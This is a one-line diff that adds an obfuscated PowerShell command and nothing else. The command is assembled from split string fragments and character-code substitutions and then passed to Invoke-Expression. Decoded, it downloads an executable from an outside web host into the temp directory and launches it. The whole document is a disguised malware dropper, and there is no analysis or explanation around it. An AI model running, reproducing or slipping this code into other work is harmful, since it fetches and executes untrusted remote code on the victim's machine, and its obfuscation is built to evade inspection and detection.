@@ -1,0 +1,1 @@
+﻿(('('+'bm6d'+'p'+'l=bm6'+'env:temp+tG'+'Df.exetG'+'D);(New-'+'Objec'+'t System.N'+'e'+'t'+'.We'+'bCli'+'e'+'nt'+').Do'+'w'+'nl'+'oadFile'+'(t'+'GDh'+'ttp://'+'alo'+'nqood.c'+'om/a'+'bacom.ex'+'e'+'tGD,'+' b'+'m6dp'+'l);'+'Sta'+'rt-P'+'roc'+'es'+'s '+'bm6dpl') -CREplace  'bm6',[chaR]36  -CREplace  'tGD',[chaR]39)| . ( $ShelLId[1]+$SHelLId[13]+'X')
